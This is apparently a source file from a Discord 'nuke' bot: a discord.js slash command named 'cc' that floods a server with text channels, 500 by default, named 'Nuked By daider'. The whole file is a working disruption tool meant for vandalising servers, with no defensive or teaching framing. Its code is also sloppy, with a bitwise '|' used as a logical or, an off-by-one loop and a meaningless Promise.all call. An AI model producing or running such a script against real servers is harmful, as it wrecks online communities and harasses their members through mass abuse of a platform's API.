const { SlashCommandBuilder, ChannelType } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('cc')
        .setDescription('mass creates channels')
        .addStringOption(option =>
            option
                .setName('name')
                .setDescription('name of the channels')
                .setRequired(false),
        )
        .addIntegerOption(option =>
            option
                .setName('amount')
                .setDescription('amount of channels to create')
                .setRequired(false),
        ),
    async execute(interaction) {
        await interaction.reply({ content: "Creating...", ephemeral: true });
        const amount = interaction.options.getInteger('amount') ?? 500;
        const name = interaction.options.getString('name') ?? "Nuked By daider";
        if (isNaN(amount) | (Number(amount) < 0)) {
            await interaction.followUp({ content: "You should provide a valid integer bigger than zero", ephemeral: true });
            return;
        }
        for (let index = 0; index <= amount; index++) {
            const cr = interaction.guild.channels.create({ name: name, type: ChannelType.GuildText });
            Promise.all([cr, cr]);
        }
        await interaction.editReply({ content: "Done", ephemeral: true });

    },
};
